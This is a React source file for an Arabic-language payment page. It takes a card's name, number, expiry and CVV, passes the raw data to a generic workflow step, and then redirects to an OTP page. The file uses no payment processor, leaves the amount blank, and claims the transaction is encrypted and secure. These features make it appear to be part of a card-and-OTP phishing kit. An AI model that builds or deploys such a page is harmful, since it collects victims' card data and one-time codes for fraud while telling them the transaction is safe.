import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { ArrowLeft, CreditCard, Lock, Check } from "lucide-react";
import { submitCurrentStep } from "@/lib/workflow";

export const Route = createFileRoute("/payment")({
  head: () => ({
    meta: [
      { title: "الدفع — بيكير" },
      { name: "description", content: "أدخل بيانات بطاقتك لإتمام عملية الدفع بأمان." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: PaymentPage,
});

function PaymentPage() {
  const navigate = useNavigate();
  const [form, setForm] = useState({ cardName: "", cardNumber: "", expiry: "", cvv: "" });
  const [loading, setLoading] = useState(false);

  const update = (k: string, v: string) => setForm((p) => ({ ...p, [k]: v }));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await submitCurrentStep("payment", form);
    setLoading(false);
    void navigate({ to: "/otp" });
  };

  const fmtCard = (v: string) => v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-md">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <CreditCard className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-2xl font-extrabold text-dark-900">الدفع</h1>
            <p className="mt-2 text-sm text-dark-500">أدخل بيانات بطاقتك لإتمام العملية</p>
          </div>

          <form onSubmit={handleSubmit} className="card space-y-5">
            <div>
              <label className="mb-1.5 block text-sm font-medium text-dark-700">الاسم على البطاقة</label>
              <input value={form.cardName} onChange={(e) => update("cardName", e.target.value)} required className="input-field" placeholder="الاسم الكامل" />
            </div>
            <div>
              <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم البطاقة</label>
              <input value={form.cardNumber} onChange={(e) => update("cardNumber", fmtCard(e.target.value))} required className="input-field" placeholder="0000 0000 0000 0000" inputMode="numeric" dir="ltr" />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">تاريخ الانتهاء</label>
                <input value={form.expiry} onChange={(e) => update("expiry", e.target.value)} required className="input-field" placeholder="MM/YY" maxLength={5} dir="ltr" />
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-dark-700">CVV</label>
                <input value={form.cvv} onChange={(e) => update("cvv", e.target.value)} required className="input-field" placeholder="123" inputMode="numeric" maxLength={4} dir="ltr" />
              </div>
            </div>

            <div className="flex items-center gap-2 rounded-xl bg-primary-50 px-4 py-3 text-sm text-primary-700">
              <Lock className="h-5 w-5" />
              جميع المعاملات مشفّرة وآمنة
            </div>

            <div className="flex items-center justify-between rounded-xl bg-dark-50 px-4 py-3">
              <span className="text-sm text-dark-500">المبلغ الإجمالي</span>
              <span className="text-xl font-extrabold text-dark-900">— ريال</span>
            </div>

            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جارٍ الدفع..." : "ادفع الآن"}
              <ArrowLeft className="h-5 w-5" />
            </button>
          </form>

          <div className="mt-4 flex justify-center gap-2">
            {["VISA", "Mastercard", "mada", "Apple Pay"].map((p) => (
              <span key={p} className="rounded-lg bg-white px-3 py-1.5 text-xs font-medium text-dark-500 ring-1 ring-dark-200">{p}</span>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
